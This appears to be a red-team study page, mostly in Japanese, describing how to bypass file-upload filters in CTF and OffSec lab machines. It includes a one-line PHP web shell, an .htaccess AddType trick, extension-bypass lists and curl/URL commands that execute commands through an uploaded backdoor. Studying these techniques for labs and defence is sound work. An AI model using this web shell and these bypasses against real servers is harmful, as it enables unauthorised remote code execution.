---
title: File Upload
parent: Web Attack
grand_parent: Red Team
---


AD系ラボやHTB系のファイルアップロード問題でよくある流れは、

shell.php → 拒否
![](../../assets/images/Pasted%20image%2020260609114951.png)

shell.php.jpg → アップロード成功
しかし実行されず画像として配信
.htaccess をアップロード
.jpg を PHP として実行させる
shell.jpg にアクセスするとコード実行というものです。

例えば、

- `.htaccess`
- `AddType application/x-httpd-php .jpg`
- `shell.jpg`

```php
<?php system($_GET['cmd']); ?>
```

の組み合わせです。

確認ポイント：

1. .htaccess はアップロードできる？
`.htaccess`

というファイル名でアップロードできるか。

アップロード後に

INVALID

だけ書いた .htaccess を置いてサイトが 500 エラーになるなら、Apache が解釈しています。

2. アップロード先はどこ？

例えば

http://target/uploads/

にアクセスできるか。

アップロードしたファイルのURLが分からないと実行できません。

3. 問題文に Apache のヒントはある？
Apache
XAMPP
LAMP
Linux

などの記述があると .htaccess の可能性が高いです。

4. ファイル名フィルタは？

以下を試して結果を見るのも有効です。

shell.phtml
shell.php5
shell.phar
shell.pht
shell.inc

Apache の設定によっては .php だけ禁止していて、他の PHP 拡張子が実行できる場合があります。

.htaccessの作成
```
AddType application/x-httpd-php .evil
```
.evilをphpとして解釈させる

![](../../assets/images/Pasted%20image%2020260609115259.png)

Upload
![](../../assets/images/Pasted%20image%2020260609115413.png)

![](../../assets/images/Pasted%20image%2020260609115433.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Access]
└─$ cp simple-backdoor.php simple-backdoor.php.evil
```

[http://192.168.129.187/uploads/simple-backdoor.php.evil](http://192.168.129.187/uploads/simple-backdoor.php.evil?cmd=whoami)

![](../../assets/images/Pasted%20image%2020260609120141.png)

---
<details markdown="1">
<summary>File Upload</summary>
# File Upload

```bash
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
```

#### Example:
- [Create Powershell Oneliner](../99_attack_repo/01-50_web/web_fileupload.md)
- [If you can't use nc](../99_attack_repo/01-50_web/web_fileupload.md)
- [If there are restrictions on uploading ASP and ASPX files](https://github.com/yangbaopeng/ashx_webshell)
- [Using Non-Executable Files]()

👉 Try:

* `.php`
* extension spoofing(`.pHP`)
* double extension (`shell.php.jpg`)
* MIME bypass

→ If success → execute shell

</details>